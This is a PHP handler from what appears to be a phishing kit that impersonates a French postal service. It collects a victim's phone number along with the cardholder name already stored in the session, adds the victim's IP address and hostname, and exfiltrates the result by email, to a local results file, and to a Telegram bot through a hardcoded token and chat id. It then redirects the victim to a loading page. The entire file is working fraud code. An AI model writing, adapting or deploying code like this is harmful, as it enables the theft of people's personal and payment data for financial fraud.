<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

if (isset($_POST['next']))
{

		$_SESSION["Steles"] = $_POST['tele'];


		$id = $_SESSION['Steles'];
		$ss = strlen($id);
		$lengthcard = $ss - 4;
		$telesX =  substr($id,$lengthcard);
		$_SESSION['Stelesx'] = $telesX;
		
		

	

	$subject  = "POSTAL [ FR ] - ".$_SERVER['REMOTE_ADDR']."";
	$headers  = "From: postal <postal@SPYUS.ORG>\r\n";
	$message .= "+───────────|  ".$_SESSION['Sname_on_card']."  |───────────\n";
    $message .= "|te : ".$_SESSION['Steles']."\n";
    $message .= "|N° : $ip / $hostname \n"; 
	
	$smolix .= "+───────────|  ".$_SESSION['Sname_on_card']."  |───────────\n";
    $smolix .= "|te : ".$_SESSION['Steles']."\n";
    $smolix .= "|N° : $ip / $hostname \n"; 
	
	$to = "@gmail.com";
	mail($to, $subject, $smolix, $headers);

	
	
$Txt_Rezlt = fopen('../rzl00.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "1443724091:AAGTUQQqlLSLzRJtapT-eRZkuxLgYCiHbOQ";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-662491150&text=" . urlencode($message)."" );



}
		header('location: loadingtele.html');


      
?>

